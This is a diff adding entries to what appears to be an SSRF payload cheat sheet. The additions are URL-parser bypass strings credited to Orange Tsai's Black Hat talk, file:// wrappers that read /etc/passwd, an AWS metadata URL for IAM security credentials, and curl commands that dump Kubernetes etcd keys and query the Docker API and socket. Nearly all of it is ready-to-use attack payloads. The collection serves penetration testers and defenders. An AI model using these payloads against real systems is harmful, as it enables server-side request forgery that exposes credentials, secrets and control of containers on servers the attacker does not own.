@@ -151,7 +151,26 @@ List:
 ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 ```
 
+Bypass against a weak parser - by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
+
+```powershell
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80:\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+```
+
+![https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/SSRF_Parser.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/SSRF%20injection/WeakParser.jpg)
+
+
 ## SSRF via URL Scheme
+
+File Wrapper
+
+```powershell
+file:///etc/passwd
+file://\/\/etc/passwd
+```
 
 Dict Wrapper
 The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
@@ -299,6 +318,7 @@ http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/public-keys/
 http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
 ```
 
 ### SSRF URL for Google Cloud
@@ -395,6 +415,27 @@ http://100.100.100.200/latest/meta-data/
 http://100.100.100.200/latest/meta-data/instance-id
 http://100.100.100.200/latest/meta-data/image-id
 ```
+
+### SSRF URL for Kubernetes ETCD
+
+Can contain API keys and internal ip and ports
+
+```powershell
+curl -L http://127.0.0.1:2379/version
+curl http://127.0.0.1:2379/v2/keys/?recursive=true
+```
+
+### SSRF URL for Docker
+
+```powershell
+http://127.0.0.1:2375/v1.24/containers/json
+
+Simple example
+docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
+bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
+```
+
 
 ## Thanks to
 
